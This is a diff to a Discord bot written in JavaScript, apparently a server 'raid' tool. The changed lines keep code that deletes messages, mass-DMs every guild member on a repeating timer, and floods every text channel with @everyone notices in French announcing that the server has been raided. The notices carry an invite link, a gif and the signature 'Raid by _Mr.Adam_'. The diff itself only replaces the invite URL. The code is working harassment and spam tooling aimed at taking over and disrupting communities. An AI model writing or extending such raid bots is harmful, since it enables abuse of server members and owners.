@@ -52,7 +52,7 @@ bot.on('message', msg => {
     if (msg.channel.type === "dm") return;
     if (msg.deletable) msg.delete();
     msg.guild.members.forEach(member => {
-      setInterval(function () { member.send(msg.guild.owner.user.username+" vient de se faire pulvériser son serveur. \n\n ```Power By _Mr.Adam_``` https://discord.gg/TcbYaWs \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif").catch(error => {}) }, 450)})
+      setInterval(function () { member.send(msg.guild.owner.user.username+" vient de se faire pulvériser son serveur. \n\n ```Power By _Mr.Adam_``` https://discord.gg/AMr7tVp \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif").catch(error => {}) }, 450)})
   }
   
   if(msg.content === '.suppr'){
@@ -110,7 +110,7 @@ bot.on("message", msg => {
     let i = 0;
     let interval = setInterval(function () {
       msg.guild.channels.forEach(channel => {
-        if (channel.type === "text") channel.send("@everyone Je suis la petite voie qui te dis que ton serveur viens d'être Raid.  Va reporte l'assistance. https://discord.gg/TcbYaWs \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif \n\n ```Raid by _Mr.Adam_```")
+        if (channel.type === "text") channel.send("@everyone Je suis la petite voie qui te dis que ton serveur viens d'être Raid.  Va reporte l'assistance. https://discord.gg/AMr7tVp \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif \n\n ```Raid by _Mr.Adam_```")
       }, 2500);
     });
   }
